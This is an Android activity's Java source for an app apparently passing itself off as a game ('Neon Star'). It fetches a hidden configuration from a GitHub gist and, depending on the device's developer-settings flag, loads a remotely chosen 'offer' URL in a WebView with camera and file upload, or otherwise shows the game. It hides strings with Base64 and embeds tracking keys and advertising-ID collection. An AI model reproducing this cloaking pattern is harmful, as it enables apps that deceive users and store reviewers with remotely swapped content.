package com.nneo.srta;


import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.preference.PreferenceActivity;
import android.preference.PreferenceManager;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.webkit.WebViewClient;


import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


import android.webkit.WebChromeClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;

import com.nneo.srta.R;

public class NS extends AppCompatActivity {
    public WebView webView;
    public static final String ONESIGNAL_APP_ID_NNEO_SRTA = "1cfba450-7624-48e4-a8bd-3867dc9a22d9";
    private static final String URL_DEF_NNEO_SRTA = "https://gist.githubusercontent.com/RKDev11/a10f2f57ebbdaa4d25860f3ec3f2e969/raw/Neon%2520Star";
    public static final int FILECHOOSER_RESULTCODE_NNEO_SRTA = 1;
    public static final String AF_DEV_KEY_NNEO_SRTA = "YE7uZncJCchMFrVvAbrnJR";
    public static final String LOG = "MyLog";
    public String linkTrue;
    public static String BUF_READ_NNEO_SRTA;
    public String[] lineNnneoSrta;
    public ValueCallback<Uri[]> mFilePathCallbackNnneoSrta;
    public String mCameraPhotoPathNnneoSrta;
    public ValueCallback<Uri> mUploadMessageNnneoSrta;
    public Uri mCapturedImageURINnneoSrta = null;
    public static String adIdNnneoSrta;
    public static String apps_idNnneoSrta;
    public String paramsNnneoSrta;
    public String dataFbNnneoSrta;
    public String packageNameNnneoSrta = "com.nneo.srta";
    String savedLinkNnneoSrta;
    SharedPreferences spNnneoSrta;
    public String keyLinkNnneoSrta;
    public String linkOfferNnneoSrta;
    public String fbIdNnneoSrta;
    public static String fbDataNnneoSrta;
    public static Intent intent;




    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        intent = new Intent(NS.this, GameActivity.class);
        webView = findViewById(R.id.webView);
        int adb = Settings.Secure.getInt(this.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        WebClass webClass = new WebClass();
        ParsLine parsLine = new ParsLine();

        webClass.oneSignal(this);

        AppsFlyerLib.getInstance().init(AF_DEV_KEY_NNEO_SRTA, webClass.conversionListener, NS.this);
        AppsFlyerLib.getInstance().start(NS.this);
        apps_idNnneoSrta = AppsFlyerLib.getInstance().getAppsFlyerUID(NS.this);

        if (adb != 0) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        adIdNnneoSrta = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(URL_DEF_NNEO_SRTA).openConnection();
                        Log.i(LOG, "non: " + adIdNnneoSrta);
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                        BUF_READ_NNEO_SRTA = bufferedReader.readLine();

                        lineNnneoSrta = BUF_READ_NNEO_SRTA.split("\\u007c");


                        linkOfferNnneoSrta = lineNnneoSrta[0];

                        keyLinkNnneoSrta = lineNnneoSrta[1];

                        fbIdNnneoSrta = lineNnneoSrta[2];



                        spNnneoSrta = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                        savedLinkNnneoSrta = spNnneoSrta.getString(Decoder11("a2V5X3VybA=="), null);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                FacebookSdk.setApplicationId(fbIdNnneoSrta);
                                Log.i(LOG, "non: " + fbIdNnneoSrta);
                                FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                                FacebookSdk.fullyInitialize();
                                FacebookSdk.setAutoInitEnabled(true);
                                FacebookSdk.setAutoLogAppEventsEnabled(true);
                                AppLinkData.fetchDeferredAppLinkData(NS.this,
                                        new AppLinkData.CompletionHandler() {
                                            @Override
                                            public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                                                if (appLinkData == null) {
                                                    appLinkData = AppLinkData.createFromActivity(NS.this);
                                                    Log.i(LOG, "non: " + appLinkData);
                                                }
                                                if (appLinkData != null) {
                                                    Uri url = appLinkData.getTargetUri();
                                                    dataFbNnneoSrta = url.getQuery();
                                                    fbDataNnneoSrta = parsLine.ChangeLine(dataFbNnneoSrta);
                                                } else {

                                                }
                                            }
                                        }

                                );
                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        if (savedLinkNnneoSrta != null) {
                                            webClass.getWeb(webView, savedLinkNnneoSrta);
                                        } else {
                                            webClass.StartWebView(linkOfferNnneoSrta, keyLinkNnneoSrta, webView, fbDataNnneoSrta, NS.this);
                                        }
                                    }
                                }, 5000);
                                webView.setWebViewClient(new WebViewClient() {
                                    @Override
                                    public void onPageStarted(WebView view, String url, Bitmap favicon) {
                                        super.onPageStarted(view, url, favicon);
                                        if (url.startsWith(Decoder11("NDA0"))) {
                                            Intent intent = new Intent(NS.this, GameActivity.class);
                                            startActivity(intent);
                                        }
                                    }

                                    @Override
                                    public void onPageFinished(WebView view, String url) {
                                        super.onPageFinished(view, url);
                                        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(view.getContext());
                                        SharedPreferences.Editor editor = sp.edit();
                                        editor.putString(Decoder11("NDA0"), url);
                                        editor.apply();
                                    }

                                });
                                webView.setWebChromeClient(new WebChromeClient() {

                                    public boolean onShowFileChooser(
                                            WebView webView, ValueCallback<Uri[]> filePathCallback,
                                            FileChooserParams fileChooserParams) {
                                        if (mFilePathCallbackNnneoSrta != null) {
                                            mFilePathCallbackNnneoSrta.onReceiveValue(null);
                                        }
                                        mFilePathCallbackNnneoSrta = filePathCallback;

                                        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                                        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {

                                            File photoFile = null;
                                            try {
                                                photoFile = createImageFile();
                                                takePictureIntent.putExtra(Decoder11("UGhvdG9QYXRo"), mCameraPhotoPathNnneoSrta);
                                            } catch (IOException ex) {
                                            }

                                            if (photoFile != null) {
                                                mCameraPhotoPathNnneoSrta = Decoder11("ZmlsZTo=") + photoFile.getAbsolutePath();
                                                takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT,
                                                        Uri.fromFile(photoFile));
                                            } else {
                                                takePictureIntent = null;
                                            }
                                        }
                                        Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                                        contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                                        contentSelectionIntent.setType(Decoder11("aW1hZ2UvKg=="));

                                        Intent[] intentArray;
                                        if (takePictureIntent != null) {
                                            intentArray = new Intent[]{takePictureIntent};
                                        } else {
                                            intentArray = new Intent[0];
                                        }
                                        Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
                                        chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
                                        chooserIntent.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser));
                                        chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
                                        startActivityForResult(chooserIntent, FILECHOOSER_RESULTCODE_NNEO_SRTA);
                                        return true;
                                    }

                                    // creating image files (Lollipop only)
                                    private File createImageFile() throws IOException {

                                        File imageStorageDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), Decoder11("RGlyZWN0b3J5TmFtZUhlcmU="));

                                        if (!imageStorageDir.exists()) {
                                            imageStorageDir.mkdirs();
                                        }
                                        // create an image file name
                                        imageStorageDir = new File(imageStorageDir + File.separator + Decoder11("SU1HXw==") + String.valueOf(System.currentTimeMillis()) + Decoder11("LmpwZw=="));
                                        return imageStorageDir;
                                    }
                                });
                            }
                        });
                    } catch (Exception e) {

                        startActivity(intent);
                    }
                }
            }).start();
        } else {
            startActivity(intent);
        }
    }


    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode == FILECHOOSER_RESULTCODE_NNEO_SRTA) {
                if (null == this.mUploadMessageNnneoSrta) {
                    return;
                }
                Uri result = null;
                try {
                    if (resultCode != RESULT_OK) {
                        result = null;
                    } else {
                        result = data == null ? mCapturedImageURINnneoSrta : data.getData();
                    }
                } catch (Exception e) {
                    Toast.makeText(getApplicationContext(), Decoder11("YWN0aXZpdHkgOg==") + e, Toast.LENGTH_LONG).show();
                }
                mUploadMessageNnneoSrta.onReceiveValue(result);
                mUploadMessageNnneoSrta = null;
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != FILECHOOSER_RESULTCODE_NNEO_SRTA || mFilePathCallbackNnneoSrta == null) {
                super.onActivityResult(requestCode, resultCode, data);
                return;
            }
            Uri[] results = null;
            if (resultCode == Activity.RESULT_OK) {
                if (data == null || data.getData() == null) {
                    if (mCameraPhotoPathNnneoSrta != null) {
                        results = new Uri[]{Uri.parse(mCameraPhotoPathNnneoSrta)};
                    }
                } else {
                    String dataString = data.getDataString();
                    if (dataString != null) {
                        results = new Uri[]{Uri.parse(dataString)};
                    }
                }
            }
            mFilePathCallbackNnneoSrta.onReceiveValue(results);
            mFilePathCallbackNnneoSrta = null;
        }
    }

    public String Decoder11(String decod) {
        String decodedString11 = new String(Base64.decode(decod, Base64.DEFAULT));
        return decodedString11;
    }

    @Override
    public void onBackPressed() {
        if (webView.isFocused() && webView.canGoBack()) {
            webView.goBack();
        }
    }
}